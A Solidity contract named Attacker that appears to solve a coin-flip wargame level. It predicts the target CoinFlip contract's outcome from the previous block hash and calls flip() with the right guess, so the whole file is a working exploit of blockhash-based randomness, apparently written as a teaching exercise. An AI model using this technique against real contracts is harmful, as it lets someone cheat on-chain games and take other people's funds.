// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './CoinFlip.sol';
import './SafeMath.sol';

contract Attacker {

  using SafeMath for uint256;
  address public target;

  constructor (address _target) public {
    target = _target;
  }

  function predict() internal returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool prediction = coinFlip == 1 ? true : false;
    return prediction;
    }

    function runflip() public {
      bool prediction = predict();
      CoinFlip coinflip = CoinFlip(target);
      coinflip.flip(prediction);
    }
}
